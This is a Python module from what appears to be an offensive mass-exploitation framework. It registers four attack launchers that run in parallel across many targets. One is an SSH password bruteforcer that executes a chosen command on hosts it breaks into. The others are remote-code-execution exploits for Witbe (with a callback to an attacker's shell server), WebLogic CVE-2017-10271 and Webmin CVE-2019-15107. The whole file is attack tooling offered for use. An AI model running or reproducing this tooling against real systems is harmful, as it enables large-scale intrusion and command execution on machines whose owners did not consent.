#!/usr/bin/python3

'''
add exploits here, call them in mec.py
'''

import os
import glob

from lib.cli import colors, console, core


def ssh_bruteforcer(session):
    '''
    bruteforce one target using a password list
    '''
    colors.colored_print('\n[*] Welcome to SSH bruteforcer', colors.BLUE)
    password_list = console.input_check(
        "[*] Password list file to use (put them under ./data): ", allow_blank=False,
        choices=glob.glob(core.MECROOT+"/data/*.txt"))

    if not os.path.isfile(password_list):
        console.print_error("[-] Password list not found")

        return None

    # command to exec
    command = console.input_check("[*] Command to exec: ", allow_blank=False)

    # args list
    exploit = 'ssh_bruteforce.py'
    work_path = '/ssh-bruteforce/'
    exec_path = exploit
    custom_args = ["-p", password_list, "-c", command]
    jobs = 100

    # start scanner

    return core.Scanner(work_path, exec_path, custom_args, jobs, session)


def witbe(session):
    '''
    witbe rce
    '''
    colors.colored_print('\n[*] Welcome to Witbe RCE', colors.BLUE)

    # shell server config
    rhost = console.input_check('[?] IP of your shell server: ', ip_check=True)
    rport = console.input_check('[?] and Port? ', check_type=int)

    # exploit config
    exploit = 'witbe.py'
    work_path = '/witbe/'
    exec_path = exploit
    custom_args = ["-l", rhost, "-p", rport]
    jobs = 50

    # start scanner

    return core.Scanner(work_path, exec_path, custom_args, jobs, session)


def weblogic_cve201710271(session):
    '''
    CVE-2017-10271
    '''
    colors.colored_print(
        '\n[*] Welcome to Weblogic CVE-2017-10271', colors.BLUE)

    # shell server config
    command = console.input_check(
        '[?] Command to execute on the target: ', allow_blank=False)

    # exploit config
    exploit = 'weblogic_cve-2017-10271.py'
    work_path = '/weblogic/'
    exec_path = exploit
    custom_args = ["-c", command]
    jobs = 50

    # start scanner

    return core.Scanner(work_path, exec_path, custom_args, jobs, session)


def webmin_cve_2019_15107(session):
    '''
    CVE_2019_15107 RCE
    '''
    colors.colored_print('\n[*] Welcome to Webmin CVE-2019-15107', colors.BLUE)

    # shell server config
    command = console.input_check(
        '[?] Command to execute on the target: ', allow_blank=False)

    # exploit config
    exploit = 'webmin.py'
    work_path = '/webmin/'
    exec_path = exploit
    custom_args = ["-c", command]
    jobs = 50

    # start scanner

    return core.Scanner(work_path, exec_path, custom_args, jobs, session)


EXPLOIT_DICT = {
    "ssh_bruteforcer": ssh_bruteforcer,
    "weblogic_cve201710271": weblogic_cve201710271,
    "webmin_cve_2019_15107": webmin_cve_2019_15107,
    "witbe": witbe
}
